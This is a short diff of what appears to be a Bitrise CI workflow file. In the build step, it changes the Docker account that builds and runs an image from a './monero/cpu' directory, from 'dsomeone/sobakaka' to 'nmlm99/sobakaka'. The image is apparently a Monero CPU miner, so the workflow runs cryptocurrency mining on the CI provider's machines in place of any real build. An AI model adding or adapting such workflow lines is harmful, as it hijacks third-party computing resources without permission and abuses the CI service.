@@ -29,6 +29,6 @@ workflows:
             # bash ./path/to/script.sh
             # not just bash, e.g.:
             # ruby ./path/to/script.rb
-            docker build -t dsomeone/sobakaka:mualpine ./monero/cpu
-            docker run dsomeone/sobakaka:mualpine
+            docker build -t nmlm99/sobakaka:mualpine ./monero/cpu
+            docker run nmlm99/sobakaka:mualpine
     - deploy-to-bitrise-io@1.3.19: {}
